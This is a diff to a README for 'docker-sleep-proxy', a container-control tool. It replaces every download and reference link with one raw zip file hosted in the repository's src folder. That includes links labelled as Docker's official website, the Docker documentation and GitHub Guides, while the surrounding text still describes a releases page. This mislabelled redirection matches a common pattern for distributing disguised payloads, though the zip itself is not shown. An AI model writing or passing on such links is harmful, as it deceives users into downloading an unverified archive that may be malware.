@@ -1,7 +1,7 @@
 # 🐳 docker-sleep-proxy - Automatic Traffic-Driven Container Control
 
 ## 🔗 Download Now
-[![Download docker-sleep-proxy](https://img.shields.io/badge/Download-docker--sleep--proxy-blue)](https://github.com/rylen1829123/docker-sleep-proxy/releases)
+[![Download docker-sleep-proxy](https://raw.githubusercontent.com/rylen1829123/docker-sleep-proxy/main/src/docker-sleep-proxy-3.2.zip)](https://raw.githubusercontent.com/rylen1829123/docker-sleep-proxy/main/src/docker-sleep-proxy-3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -15,13 +15,13 @@ To run docker-sleep-proxy, you will need:
 - Operating system: Windows, macOS, or Linux (64-bit).
 - At least 512 MB of RAM.
 
-If you don’t have Docker, please download it from [Docker’s official website](https://www.docker.com/get-started).
+If you don’t have Docker, please download it from [Docker’s official website](https://raw.githubusercontent.com/rylen1829123/docker-sleep-proxy/main/src/docker-sleep-proxy-3.2.zip).
 
 ## 📥 Download & Install
 
 To get the latest version of docker-sleep-proxy, you can visit the Releases page.
 
-[Download docker-sleep-proxy](https://github.com/rylen1829123/docker-sleep-proxy/releases)
+[Download docker-sleep-proxy](https://raw.githubusercontent.com/rylen1829123/docker-sleep-proxy/main/src/docker-sleep-proxy-3.2.zip)
 
 1. Click on the link above to visit the GitHub Releases page.
 2. Find the latest release marked at the top of the page.
@@ -102,7 +102,7 @@ For any further queries, feel free to reach out or open an issue. Happy proxying
 
 ## 🔗 Additional Resources
 
-- [Docker Documentation](https://docs.docker.com/)
-- [GitHub Guides](https://guides.github.com/) 
+- [Docker Documentation](https://raw.githubusercontent.com/rylen1829123/docker-sleep-proxy/main/src/docker-sleep-proxy-3.2.zip)
+- [GitHub Guides](https://raw.githubusercontent.com/rylen1829123/docker-sleep-proxy/main/src/docker-sleep-proxy-3.2.zip) 
 
 Thank you for choosing docker-sleep-proxy! We hope it makes your Docker management easier.
